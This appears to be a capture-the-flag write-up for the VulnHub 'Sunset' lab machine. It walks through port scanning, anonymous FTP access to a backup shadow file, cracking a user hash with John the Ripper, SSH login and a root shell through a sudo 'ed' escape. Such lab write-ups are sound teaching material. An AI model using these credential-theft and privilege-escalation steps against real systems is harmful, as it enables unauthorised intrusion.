# Sunset VulnHub Writeup

## Reconnaissance

I began with a full port scan to identify exposed services on the target system.

`nmap -p- <target_ip>`

The scan revealed two open ports:
- **21 (FTP)**
- **22 (SSH)**

![nmap](/images/sunset_nmap.png)



## Service Enumeration

### FTP (Port 21)

I performed a service/version detection scan:

`nmap -sV -p 21 <target_ip>`

The FTP service was identified as:

- `ftpd 1.5.5`

Searching for known vulnerabilities for this version did not yield any useful exploits.



### FTP Anonymous Access

I then ran an Nmap script scan to check for misconfigurations:

`nmap --script ftp-anon -p 21 <target_ip>`

The results indicated that **anonymous login is enabled**.

![ftp](/images/sunset_nmap_ftp.png)



## FTP Access

I connected to the FTP service:

`ftp <target_ip>`

Login credentials used:
- **Username:** `anonymous`
- **Password:** (any random input)

After logging in, I listed the available files and found a **backup shadow file**.

![ftp](/images/ftp_backup.png)

I viewed the file contents:

`less <filename>`

Then downloaded it locally:

`get <filename>`

Exited the FTP session:

`by`



## Credential Extraction

From the downloaded file, I extracted the line corresponding to the user `sunset` and saved it into a file:

`hash.txt`



## Password Cracking

I used John the Ripper with the `rockyou.txt` wordlist to crack the hash:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

The credentials were successfully recovered:
- **Username:** `sunset`
- **Password:** `cheer14`

![john](/images/brute_force.png)



## Initial Access

Using the recovered credentials, I established an SSH session:

`ssh sunset@<target_ip>`

This provided access as a low-privileged user.




## Privilege Escalation

To identify potential privilege escalation vectors, I checked sudo permissions:

`sudo -l`

The output showed that the following binary can be executed with elevated privileges:

- `/usr/bin/ed`




### Exploiting `ed` (GTFOBins)

I referred to GTFOBins and used `ed` to spawn a privileged shell:

`sudo ed`

Inside `ed`, I executed:

`!/bin/sh`

This resulted in a root shell.


## Root Access

After successful privilege escalation, I gained full root access to the system.

![root](/images/flags.png)